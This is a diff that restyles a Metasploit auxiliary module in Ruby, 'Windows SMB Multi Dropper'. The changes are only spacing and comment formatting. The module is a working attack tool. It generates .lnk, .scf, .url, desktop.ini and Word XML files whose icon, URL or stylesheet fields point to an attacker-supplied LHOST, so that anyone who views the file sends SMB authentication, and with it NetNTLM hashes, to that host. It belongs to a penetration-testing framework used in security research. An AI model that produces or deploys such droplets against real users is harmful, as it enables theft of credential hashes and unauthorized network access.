@@ -3,78 +3,78 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows SMB Multi Dropper',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows SMB Multi Dropper',
+        'Description' => %q{
           This module dependent on the given filename extension creates either
           a .lnk, .scf, .url, .xml, or desktop.ini file which includes a reference
           to the the specified remote host, causing SMB connections to be initiated
           from any user that views the file.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-            [
-              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
-              'Lnk Creation Code by Mubix',         #Lnk Creation Code written by Mubix
-              'asoto-r7'                            #Word XML creation code
-            ],
-        'Platform'      => [ 'win' ],
-        'References'    =>
-        [
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Richard Davy - secureyourit.co.uk', # Module written by Richard Davy
+          'Lnk Creation Code by Mubix',         # Lnk Creation Code written by Mubix
+          'asoto-r7'                            # Word XML creation code
+        ],
+        'Platform' => [ 'win' ],
+        'References' => [
           ['URL', 'https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018'],
           ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/'],
           ['URL', 'https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/'],
         ]
-
-      ))
+      )
+    )
     register_options(
       [
         OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
         OptString.new("FILENAME", [ true, "Filename - supports *.lnk, *.scf, *.url, *.xml, desktop.ini", "word.lnk"]),
-      ])
+      ]
+    )
   end
 
   def run
-    if datastore['FILENAME'].chars.last(3).join=="lnk"
-        createlnk
-    elsif datastore['FILENAME'].chars.last(3).join=="scf"
-        createscf
-    elsif datastore['FILENAME']=="desktop.ini"
-        create_desktopini
-    elsif datastore['FILENAME'].chars.last(3).join=="url"
-        create_url
-    elsif datastore['FILENAME'].chars.last(3).join=="xml"
-        create_xml
+    if datastore['FILENAME'].chars.last(3).join == "lnk"
+      createlnk
+    elsif datastore['FILENAME'].chars.last(3).join == "scf"
+      createscf
+    elsif datastore['FILENAME'] == "desktop.ini"
+      create_desktopini
+    elsif datastore['FILENAME'].chars.last(3).join == "url"
+      create_url
+    elsif datastore['FILENAME'].chars.last(3).join == "xml"
+      create_xml
     else
-        fail_with(Failure::BadConfig,"Invalid FILENAME option")
+      fail_with(Failure::BadConfig, "Invalid FILENAME option")
     end
   end
 
   def createlnk
-    #Code below taken from module droplnk.rb written by Mubix
+    # Code below taken from module droplnk.rb written by Mubix
     lnk = ""
-    lnk << "\x4c\x00\x00\x00"                  #Header size
-    lnk << "\x01\x14\x02\x00\x00\x00\x00\x00"  #Link CLSID
+    lnk << "\x4c\x00\x00\x00"                  # Header size
+    lnk << "\x01\x14\x02\x00\x00\x00\x00\x00"  # Link CLSID
     lnk << "\xc0\x00\x00\x00\x00\x00\x00\x46"
-    lnk << "\xdb\x00\x00\x00"                  #Link flags
-    lnk << "\x20\x00\x00\x00"                  #File attributes
-    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Creation time
-    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Access time
-    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Write time
-    lnk << "\x00\x00\x00\x00"                  #File size
-    lnk << "\x00\x00\x00\x00"                  #Icon index
-    lnk << "\x01\x00\x00\x00"                  #Show command
-    lnk << "\x00\x00"                          #Hotkey
-    lnk << "\x00\x00"                          #Reserved
-    lnk << "\x00\x00\x00\x00"                  #Reserved
-    lnk << "\x00\x00\x00\x00"                  #Reserved
-    lnk << "\x7b\x00"                          #IDListSize
-    #sIDList
+    lnk << "\xdb\x00\x00\x00"                  # Link flags
+    lnk << "\x20\x00\x00\x00"                  # File attributes
+    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  # Creation time
+    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  # Access time
+    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  # Write time
+    lnk << "\x00\x00\x00\x00"                  # File size
+    lnk << "\x00\x00\x00\x00"                  # Icon index
+    lnk << "\x01\x00\x00\x00"                  # Show command
+    lnk << "\x00\x00"                          # Hotkey
+    lnk << "\x00\x00"                          # Reserved
+    lnk << "\x00\x00\x00\x00"                  # Reserved
+    lnk << "\x00\x00\x00\x00"                  # Reserved
+    lnk << "\x7b\x00"                          # IDListSize
+    # sIDList
     lnk << "\x14\x00\x1f\x50\xe0\x4f\xd0\x20"
     lnk << "\xea\x3a\x69\x10\xa2\xd8\x08\x00"
     lnk << "\x2b\x30\x30\x9d\x19\x00\x2f"
@@ -87,19 +87,19 @@ class MetasploitModule < Msf::Auxiliary
     lnk << "\x5b\x15\x14\x00\x00\x00"
     lnk << Rex::Text.to_unicode("AUTOEXEC.BAT")
     lnk << "\x00\x00\x1c\x00\x00\x00"
-    #sLinkInfo
+    # sLinkInfo
     lnk << "\x3e\x00\x00\x00\x1c\x00\x00\x00\x01\x00"
     lnk << "\x00\x00\x1c\x00\x00\x00\x2d\x00\x00\x00\x00\x00\x00\x00\x3d\x00"
     lnk << "\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x3e\x77\xbf\xbc\x10\x00"
     lnk << "\x00\x00\x00"
     lnk << "C:\\AUTOEXEC.BAT"
     lnk << "\x00\x00\x0e\x00"
-    #RELATIVE_PATH
+    # RELATIVE_PATH
     lnk << Rex::Text.to_unicode(".\\AUTOEXEC.BAT")
     lnk << "\x03\x00"
-    #WORKING_DIR
+    # WORKING_DIR
     lnk << Rex::Text.to_unicode("C:\\")
-    #ICON LOCATION
+    # ICON LOCATION
     lnk << "\x1c\x00"
     lnk << Rex::Text.to_unicode("\\\\#{datastore['LHOST']}\\icon.ico")
     lnk << "\x00\x00\x03\x00\x00\xa0\x58\x00\x00\x00\x00\x00\x00\x00"
@@ -114,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def createscf
-    scf=""
+    scf = ""
     scf << "[Shell]\n"
     scf << "Command=2\n"
     scf << "IconFile=\\\\#{datastore['LHOST']}\\test.ico\n"
@@ -125,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_desktopini
-    ini=""
+    ini = ""
     ini << "[.ShellClassInfo]\n"
     ini << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
     ini << "IconIndex=1337"
@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_url
-    url=""
+    url = ""
     url << "[InternetShortcut]\n"
     url << "URL=file://#{datastore['LHOST']}/url.html\n"
     url << "IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n"
@@ -143,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_xml
-    xml=""
+    xml = ""
     xml << "<?xml version='1.0' encoding='utf-8' ?>"
     xml << "<?mso-application progid='Word.Document'?>"
     xml << "<?xml-stylesheet type='text/xsl' href='file://#{datastore['LHOST']}/share/word.xsl'?>"
